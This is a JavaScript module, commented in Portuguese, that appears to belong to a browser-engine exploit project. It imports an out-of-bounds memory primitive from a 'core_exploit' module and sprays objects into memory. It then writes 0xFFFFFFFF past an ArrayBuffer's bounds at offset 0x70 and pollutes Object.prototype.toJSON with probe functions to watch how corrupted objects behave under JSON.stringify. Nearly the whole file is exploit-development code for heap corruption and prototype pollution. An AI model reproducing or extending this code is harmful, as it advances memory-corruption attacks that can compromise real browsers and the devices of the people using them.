// js/script3/testIsolateForInRangeError.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObjectForRangeError {
    constructor(id) {
        this.id = `RangeErrorTestObj-${id}`;
        this.marker = 0x1234ABCD;
        this.data = [id, id + 1, id + 2];
        this.subObject = { nested_prop: id * 10 };
        this[`prop${id}`] = id;
        this[`anotherProp${id}`] = `val${id}`;
    }
}

export const toJSON_RangeErrorVariants = {
    V0_EmptyReturn: function() { /* ... (como antes) ... */
        return { variant: "V0_EmptyReturn" };
    },
    V1_AccessThisId: function() { /* ... (como antes) ... */
        try { return { variant: "V1_AccessThisId", id: String(this.id).substring(0,50) }; }
        catch (e) { return { variant: "V1_AccessThisId", error: `${e.name}: ${e.message}` }; }
    },
    V2_ToStringCallThis: function() { /* ... (como antes) ... */
        try { return { variant: "V2_ToStringCallThis", type: Object.prototype.toString.call(this) }; }
        catch (e) { return { variant: "V2_ToStringCallThis", error: `${e.name}: ${e.message}` }; }
    },
    V3_LoopInEmpty_Limited: function() { /* ... (como antes) ... */
        let count = 0;
        try {
            for (const p in this) {
                count++;
                if (count > 1000) { 
                    return { variant: "V3_LoopInEmpty_Limited", error: "Loop > 1000 iterations", count };
                }
            }
            return { variant: "V3_LoopInEmpty_Limited", count };
        } catch (e) {
            return { variant: "V3_LoopInEmpty_Limited", error: e.message, count_at_error: count };
        }
    },
    V4_LoopInWithAccess_Limited: function() { 
        let props = {}; let count = 0;
        const FNAME_toJSON_Internal = "V4_LoopInWithAccess_Limited";
        let last_prop_attempted_log = "N/A_LoopStart";
        // LOG NO INÍCIO DA FUNÇÃO toJSON
        logS3(`   [${FNAME_toJSON_Internal}] FUNÇÃO toJSON INICIADA (ID do this: ${this ? this.id : "N/A"}).`, "info", FNAME_toJSON_Internal);
        try {
            logS3(`   [${FNAME_toJSON_Internal}] Iniciando loop for...in...`, "info", FNAME_toJSON_Internal);
            for (const p in this) {
                count++;
                last_prop_attempted_log = p;
                logS3(`     [${FNAME_toJSON_Internal}] Loop ${count}: Tentando acessar prop '${p}'...`, "info", FNAME_toJSON_Internal);
                const val = this[p]; 
                props[p] = (typeof val === 'function') ? "[Function]" : String(val).substring(0, 30);
                logS3(`       [${FNAME_toJSON_Internal}] Prop '${p}' acessada. Valor (truncado): ${props[p]}`, "info", FNAME_toJSON_Internal);
                if (count > 100) {
                    logS3(`     [${FNAME_toJSON_Internal}] Limite de iteração (100) atingido.`, "warn", FNAME_toJSON_Internal);
                    props['...'] = "truncated_loop"; break;
                }
            }
            return { variant: FNAME_toJSON_Internal, props: props, count: count, last_prop_attempted: last_prop_attempted_log };
        } catch (e) {
            logS3(`     [${FNAME_toJSON_Internal}] ERRO dentro do loop for...in ao processar prop '${last_prop_attempted_log}': ${e.name} - ${e.message}`, "error", FNAME_toJSON_Internal);
            return { variant: FNAME_toJSON_Internal, error: `${e.name}: ${e.message}`, props_collected: props, count_at_error: count, last_prop_attempted: last_prop_attempted_log };
        }
    },
    V4_Dummy: function() { /* ... (como antes) ... */
        logS3("   [V4_Dummy toJSON] Chamada.", "info", "V4_Dummy");
        return { variant: "V4_Dummy", message: "Corpo vazio, apenas para testar a definição."};
    },
    V5_ObjectKeysThenAccess_Limited: function() { /* ... (como antes) ... */
        let props = {}; let keys = []; let count = 0;
        const FNAME_toJSON_Internal = "V5_ObjectKeysThenAccess_Limited";
        let last_prop_attempted_log = "N/A_LoopStart_ObjectKeys";
         logS3(`   [${FNAME_toJSON_Internal}] FUNÇÃO toJSON INICIADA (ID do this: ${this ? this.id : "N/A"}).`, "info", FNAME_toJSON_Internal);
        try {
            keys = Object.keys(this);
            logS3(`   [${FNAME_toJSON_Internal}] Object.keys(this) retornou ${keys.length} chaves. Iterando...`, "info", FNAME_toJSON_Internal);
            for (const p of keys) {
                count++;
                last_prop_attempted_log = p;
                logS3(`     [${FNAME_toJSON_Internal}] Loop ${count}/${keys.length}: Tentando acessar this['${p}']...`, "info", FNAME_toJSON_Internal);
                const val = this[p];
                try { props[p] = String(this[p]).substring(0, 30); }
                catch(e_prop) { props[p] = `Error accessing prop ${p}: ${e_prop.name}`; }
                logS3(`       [${FNAME_toJSON_Internal}] Prop '${p}' acessada. Valor (truncado): ${props[p]}`, "info", FNAME_toJSON_Internal);
                if (count > 100) {
                     logS3(`     [${FNAME_toJSON_Internal}] Limite de iteração (100) atingido.`, "warn", FNAME_toJSON_Internal);
                     props['...'] = "truncated_loop_ObjectKeys"; break;
                }
            }
            return { variant: FNAME_toJSON_Internal, props: props, num_keys: keys.length, count: count, last_prop_attempted: last_prop_attempted_log };
        } catch (e) {
            logS3(`     [${FNAME_toJSON_Internal}] ERRO durante loop Object.keys ao processar prop '${last_prop_attempted_log}': ${e.name} - ${e.message}`, "error", FNAME_toJSON_Internal);
            return { variant: FNAME_toJSON_Internal, error: `${e.name}: ${e.message}`, keys_collected: keys.length, props_collected: props, count_at_error: count, last_prop_attempted: last_prop_attempted_log };
        }
    }
};

export async function executeProbeComplexObjectWithMinimalToJSONs(
    toJSONFunctionToUse,
    toJSONFunctionName
) {
    // LOG NO INÍCIO DESTA FUNÇÃO PARA VER SE ELA É CHAMADA
    const FNAME_TEST = `executeProbeComplexObj<${toJSONFunctionName}>`;
    logS3(`>>> [${FNAME_TEST}] INÍCIO DA FUNÇÃO. Usando ${toJSONFunctionName}. (PONTO DE VERIFICAÇÃO 0) <<<`, "test", FNAME_TEST);

    const spray_count = 10; // Reduzido para focar
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = 0x70;
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObjectForRangeError(i));
        }
    } catch (e_spray) {
        logS3(`ERRO no spray para ${toJSONFunctionName}: ${e_spray.message}`, "error", FNAME_TEST);
        return { error: e_spray, toJSON_name: toJSONFunctionName, stringifyResult: null };
    }

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { error: new Error("OOB Setup Failed"), toJSON_name: toJSONFunctionName, stringifyResult: null };
    }
    try {
        logS3(`  Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3("  Escrita OOB feita. (PONTO DE VERIFICAÇÃO 1)", "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`  ERRO na escrita OOB para ${toJSONFunctionName}: ${e_write.message}`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { error: e_write, toJSON_name: toJSONFunctionName, stringifyResult: null };
    }
    
    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let resultFromProbe = { toJSON_name: toJSONFunctionName, error: null, stringifyResult: null, object_id: null };

    try {
        logS3(`  PREPARANDO PARA POLUIR Object.prototype.${ppKey_val} com ${toJSONFunctionName}... (PONTO DE VERIFICAÇÃO 2)`, "info", FNAME_TEST);
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`  Poluição de Object.prototype.${ppKey_val} com ${toJSONFunctionName} FEITA. (PONTO DE VERIFICAÇÃO 3)`, "info", FNAME_TEST);

        const target_obj_to_stringify = sprayed_objects[0];
        if (target_obj_to_stringify) {
            resultFromProbe.object_id = target_obj_to_stringify.id;
            logS3(`  Chamando JSON.stringify(sprayed_objects[0]) (ID: ${target_obj_to_stringify.id}) com ${toJSONFunctionName}... (PONTO DE VERIFICAÇÃO 4)`, "info", FNAME_TEST);
            resultFromProbe.stringifyResult = JSON.stringify(target_obj_to_stringify);
            logS3(`    JSON.stringify completou. Resultado da toJSON: ${JSON.stringify(resultFromProbe.stringifyResult)} (PONTO DE VERIFICAÇÃO 5)`, "info", FNAME_TEST);
            if (resultFromProbe.stringifyResult && resultFromProbe.stringifyResult.error) {
                resultFromProbe.error = new Error(`Erro interno da toJSON: ${resultFromProbe.stringifyResult.error}`);
            }
        }
    } catch (e_str) {
        resultFromProbe.error = e_str;
        logS3(`    !!!! ERRO AO STRINGIFY obj[0] com ${toJSONFunctionName} !!!!: ${e_str.name} - ${e_str.message} (PONTO DE VERIFICAÇÃO 6)`, "critical", FNAME_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype.toJSON;
        }
        logS3(`  Limpeza de poluição para ${toJSONFunctionName} concluída. (PONTO DE VERIFICAÇÃO 7)`, "info", FNAME_TEST);
    }

    if (resultFromProbe.error) {
        logS3(`  ---> ${toJSONFunctionName}: PROBLEMA DETECTADO: ${resultFromProbe.error.name} - ${resultFromProbe.error.message}`, "critical", FNAME_TEST);
    } else {
        logS3(`  ---> ${toJSONFunctionName}: Completou sem erro explícito.`, "good", FNAME_TEST);
    }

    clearOOBEnvironment();
    sprayed_objects.length = 0;
    return resultFromProbe;
}
